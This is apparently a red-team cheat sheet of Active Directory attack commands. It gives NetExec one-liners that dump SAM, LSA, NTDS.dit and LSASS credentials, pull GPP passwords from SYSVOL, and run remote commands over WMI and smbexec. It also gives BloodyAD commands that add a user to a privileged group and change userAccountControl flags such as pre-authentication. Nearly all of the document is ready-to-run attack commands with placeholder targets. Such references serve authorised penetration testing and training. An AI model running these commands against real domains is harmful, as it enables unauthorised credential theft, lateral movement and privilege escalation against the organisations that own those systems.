# AI - Active Directory Attacks

## ⚡ Attack Vectors
- [ ] **Dump Secrets** -> [[#Credential Dumping (NetExec)]]
- [ ] **Check GPP** -> [[#Exploitation Modules]]
- [ ] **Execute Command** -> [[#Exploitation Modules]]
- [ ] **BloodyAD Abuse** -> [[#BloodyAD Exploitation]]

---

## Credential Dumping (NetExec)

### SAM & LSA Secrets
*Requires Local Admin or Domain Admin privileges.*

**Dump SAM**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password --sam
```

**Dump LSA**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password --lsa
```

### NTDS.dit
*Requires Domain Admin privileges on a Domain Controller.*

**Dump NTDS (VSS)**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password --ntds
```

**Dump NTDS (NTDSUtil)**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password -M ntdsutil
```

### LSASS Dumping
*Risky - may trigger AV.*

**LSASSY**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password -M lsassy
```

**NanoDump**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password -M nanodump
```

---

## Exploitation Modules

### Group Policy Preferences (GPP)
*Search for passwords in SYSVOL XML files.*
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password -M gpp_autologin
```

### Command Execution
**WMI Exec**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password -x "whoami"
```

**SMB Exec**
```blade-bash tab="ops" pane="one"
nxc smb $ip -u $user -p $password --exec-method smbexec -x "whoami"
```

---

## BloodyAD Exploitation

### Add User to Group
*Add a user to a high-privilege group (e.g., 'Remote Desktop Users').*
```blade-bash tab="ops" pane="one"
python bloodyAD.py --host $ip -u $user -p $password -d $domain add groupMember 'Remote Desktop Users' '$target_user'
```

### Set UserAccountControl (UAC)
*Example: Enable 'Don't Require PreAuth' or other flags.*
```blade-bash tab="ops" pane="one"
python bloodyAD.py --host $ip -u $user -p $password -d $domain set object '$target_user' userAccountControl -v $uac_value
```